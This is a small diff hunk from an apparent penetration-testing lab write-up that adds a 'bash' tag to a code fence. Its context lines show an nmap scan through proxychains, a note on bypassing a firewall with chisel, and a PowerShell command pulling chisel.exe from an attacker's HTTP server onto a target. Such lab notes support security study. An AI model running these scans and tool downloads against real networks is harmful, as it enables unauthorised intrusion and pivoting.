@@ -112,7 +112,7 @@ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -F 172.16.214.10-14 172.16.214
 ```
 
 get around the firewall using chisel. now we find that we can see ports open on some of the internal machines
-```
+```bash
 cp /home/kali/beyond/chisel.exe /home/kali/medtech
 cd C:\TEMP
 iwr -uri http://192.168.45.242:8000/chisel.exe -Outfile chisel.exe
